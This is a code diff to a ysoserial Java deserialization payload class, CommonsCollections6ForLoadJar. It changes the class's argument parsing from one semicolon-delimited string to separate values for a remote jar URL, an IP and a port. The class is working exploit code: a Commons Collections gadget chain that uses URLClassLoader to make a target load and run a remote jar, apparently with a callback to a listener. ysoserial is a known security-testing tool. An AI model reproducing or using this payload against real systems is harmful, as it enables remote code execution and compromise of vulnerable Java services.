@@ -36,13 +36,12 @@ import ysoserial.payloads.util.PayloadRunner;
 @Authors({ Authors.MATTHIASKAISER })
 public class CommonsCollections6ForLoadJar extends PayloadRunner implements ObjectPayload<Serializable> {
 
-    public Serializable getObject(final String ipAndHost) throws Exception {
+    public Serializable getObject(final String ... ipAndHost) throws Exception {
+        // http://127.0.0.1:8080/R.jar 127.0.0.1 4444
+        String payloadUrl = ipAndHost[0];
 
-        // http://127.0.0.1:8080/R.jar;127.0.0.1:4444
-        String payloadUrl = ipAndHost.substring(0,ipAndHost.indexOf(";"));
-
-        String ip2 = ipAndHost.substring(ipAndHost.indexOf(";")+1,ipAndHost.lastIndexOf(":"));
-        Integer port2 = Integer.parseInt(ipAndHost.substring(ipAndHost.lastIndexOf(":")+1));
+        String ip2 = ipAndHost[1];
+        Integer port2 = Integer.parseInt(ipAndHost[2]);
         // real chain for after setup
         final Transformer[] transformers = new Transformer[] {
             new ConstantTransformer(java.net.URLClassLoader.class),
